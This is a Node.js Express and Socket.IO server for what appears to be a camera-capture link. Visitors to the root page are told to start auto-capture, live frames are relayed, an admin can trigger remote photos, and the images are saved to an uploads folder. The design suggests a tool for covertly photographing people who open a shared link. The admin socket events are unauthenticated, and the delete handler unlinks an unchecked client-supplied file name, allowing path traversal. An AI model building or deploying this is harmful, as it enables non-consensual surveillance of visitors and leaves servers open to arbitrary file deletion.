const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

let storedPhotos = [];
let isAutoCaptureOn = true;
let isLinkActive = true; // Link access state control

// Middleware / Route check for Link ON/OFF status
app.use((req, res, next) => {
    if (!isLinkActive && req.path !== '/admin.html') {
        return res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head><title>Link Expired</title></head>
            <body style="background:#111; color:#fff; text-align:center; padding-top:20vh; font-family:sans-serif;">
                <h2>⚠️ This link is currently disabled by Admin.</h2>
                <p>Please try again later.</p>
            </body>
            </html>
        `);
    }
    next();
});

app.get('/admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

app.get('/user.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'user.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'user.html'));
});

app.use(express.static(__dirname));
app.use('/uploads', express.static(uploadDir));

io.on('connection', (socket) => {

    socket.on('admin-auth-success', () => {
        socket.emit('load-stored-photos', storedPhotos);
    });

    // Admin toggle link state handler
    socket.on('admin-toggle-link', (status) => {
        isLinkActive = status;
        console.log(`🔗 Link status changed by Admin: ${isLinkActive}`);
        if (!isLinkActive) {
            // Disconnect/stop active users instantly
            io.emit('disable-user-access');
        }
    });

    socket.on('user-ready', () => {
        if (isAutoCaptureOn && isLinkActive) {
            socket.emit('start-auto-capture');
        }
    });

    socket.on('live-stream-frame', (frameData) => {
        if (isLinkActive) {
            io.emit('update-live-stream', frameData);
        }
    });

    socket.on('admin-trigger-capture', () => {
        if (isLinkActive) {
            io.emit('capture-photo');
        }
    });

    socket.on('user-photo-captured', (imageData) => {
        if (!isLinkActive) return;
        const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");
        const fileName = `photo_${Date.now()}.jpg`;
        const filePath = path.join(uploadDir, fileName);

        fs.writeFile(filePath, base64Data, 'base64', (err) => {
            if (!err) console.log(`✅ Photo Saved: uploads/${fileName}`);
        });

        const photoObj = { imageData, fileName };
        storedPhotos.push(photoObj);

        if (storedPhotos.length > 30) storedPhotos.shift();

        io.emit('send-photo-to-admin', photoObj);
    });

    socket.on('delete-photo', (fileName) => {
        storedPhotos = storedPhotos.filter(p => p.fileName !== fileName);
        const filePath = path.join(uploadDir, fileName);
        if (fs.existsSync(filePath)) {
            fs.unlink(filePath, (err) => {
                if (!err) console.log(`🗑️ Deleted file: ${fileName}`);
            });
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SERVER RUNNING on port ${PORT}!`);
});